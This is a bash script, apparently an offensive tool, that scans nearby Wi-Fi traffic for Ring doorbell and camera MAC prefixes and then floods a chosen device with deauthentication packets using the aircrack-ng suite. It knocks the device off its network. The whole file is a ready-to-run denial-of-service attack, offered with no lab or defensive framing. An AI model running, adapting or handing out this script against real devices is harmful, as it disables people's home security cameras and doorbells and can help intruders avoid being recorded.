#!/bin/bash
# Interactive script for sending disassociation packets to ring devices
# Credit https://github.com/kok4i/

# Create output directory
sudo mkdir /tmp/rdos/

# ASCII art
ascii_art() {
    cat << "EOF"
       __   _             _____        _____      _        
      / /  (_)           |  __ \      / ____|    | |       
     / / __ _ _ __   __ _| |  | | ___| (___   ___| |__     
    / / '__| | '_ \ / _` | |  | |/ _ \\___ \ / __| '_ \    
 _ / /| |  | | | | | (_| | |__| | (_) |___) |\__ \ | | |   
(_)_/ |_|  |_|_| |_|\__, |_____/ \___/_____(_)___/_| |_|   
                      __/ |                                 
                     |___/
EOF
}

# Call the function to display the ASCII art
ascii_art



# Function to run when Ctrl+C is pressed
custom_interrupt() {
    clear
    printf "Ctrl+C detected, cleaning up and returning to station mode...\n"
    sudo airmon-ng stop $INF > /dev/null 2>&1
    sudo rm -rf /tmp/rdos > /dev/null 2>&1
    exit 1  # Exit the script
}

# Custom exit function
custom_exit() {
    printf "Cleaning up and returning to station mode...\n"
    sudo rm -rf /tmp/rdos > /dev/null 2>&1
    sudo airmon-ng stop $INF > /dev/null 2>&1
    exit 1 # Exit the script
}

# Airodump scan function
airodump_scan() {
    printf 'Executing airodump-ng..\nPress Ctrl+C to stop the capture and press the A key to cycle between modes while viewing\n'
    sleep 3; clear
    sudo airodump-ng -i $INF --manufacturer -w /tmp/rdos/airodump --output-format csv
}

# Set up the custom action for Ctrl+C
trap custom_interrupt SIGINT

# Prechecks before script runs

# Check for root
if [ "$EUID" -ne 0 ]; then 
    printf "Please run as root\n"
    sleep 2; custom_exit
fi

# Print logo art
ascii_art

# Check for aircrack-ng
if which aircrack-ng | grep -q 'aircrack-ng'; then
    printf 'aircrack-ng toolkit check passed!\n'
else    
    printf "aircrack-ng toolkit check failed. Make sure it's installed before continuing!\n"
    sleep 2; custom_exit
fi

# Check for iwconfig
if which iwconfig | grep -q 'iwconfig'; then
    printf 'iwconfig check passed!\n'
else    
    printf "iwconfig check failed. Make sure it's installed before continuing!\n"
    sleep 2; custom_exit
fi

# Clear screen and reprint art
clear
ascii_art

# Get a list of wireless interfaces
wireless_interfaces=($(iwconfig 2>/dev/null | grep -E '^[[:alnum:]]+\s+IEEE 802\.11' | awk '{print $1}'))

# Check if there are no wireless interfaces
if [ ${#wireless_interfaces[@]} -eq 0 ]; then
    printf "No wireless interfaces found."
    exit 1
fi

# Create an associative array to map numbers to interface names
declare -A interface_map
index=1 # Initialize the index to 1
for interface in "${wireless_interfaces[@]}"; do
    interface_map["$index"]="$interface"
    ((index++)) # Increment the index for the next interface
done

# Display the menu
printf "Select a wireless interface:"
for key in "${!interface_map[@]}"; do
    printf "$key: ${interface_map[$key]}"
done

# Prompt the user for their choice
read -p "Enter the number of the wireless interface you want to use: " choice

# Validate the choice
if [[ -n ${interface_map[$choice]} ]]; then
    ITMP="${interface_map[$choice]}"
else
    printf "Invalid choice. Please enter a valid number."
    custom_exit
fi

INF=$(sudo airmon-ng start $ITMP | grep -oP '\b\w+mon\b' | awk '!/airmon|daemon/')
sleep 1; clear

# Run airodump 
airodump_scan

# Search for ring devices
RESULT=$(ls /tmp/rdos | grep -E "airodump-[0-9]+\.csv")

# Check if any devices match the filter
if ! grep -qE '54:E0:19|5C:47:5E|9C:76:13|34:3E:A4|64:9A:63|90:48:6C' /tmp/rdos/$RESULT; then
    while true; do
        clear
        printf '\e[1m\e[31mNo ring devices found!\n\e[0m'
        sleep 2
        read -p "Do you want to run the scan again?[y/n]: " choice1
        case "$choice1" in
            [Yy]*)
                sudo rm -r /tmp/rdos*
                airodump_scan
                if grep -qE '54:E0:19|5C:47:5E|9C:76:13|34:3E:A4|64:9A:63|90:48:6C' /tmp/rdos/$RESULT; then
                    break
                fi
                ;;
            [Nn]*)
                custom_exit
                ;;
            *)
                printf "Invalid choice. Please enter 'y' or 'n'."
                ;;
        esac
    done
else
    # Print the header
    clear
    printf '\e[31;1mRing devices found!\n\e[0m'
    sleep 1
fi

# Aireplay attack start
clear
printf "Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs\n"
grep --color -E '54:E0:19|5C:47:5E|9C:76:13|34:3E:A4|64:9A:63|90:48:6C' /tmp/rdos/$RESULT
printf "\n"
read -p "Enter BSSID of target: " BSSID
read -p "Enter MAC of target: " MAC
CHNL=$(awk -F, -v BSSID="$BSSID" '$0 ~ BSSID {split($0, fields, ",");channel = gensub(/[^0-9]+/, "", "g", fields[4]); if (channel <= 13) print channel}' /tmp/rdos/$RESULT)
printf "Setting the monitor channel to the same channel the target AP is on..."
sudo airmon-ng stop $INF
sudo airmon-ng start $ITMP $CHNL
sudo aireplay-ng -0 100 -a $BSSID -c $MAC $INF 
custom_exit

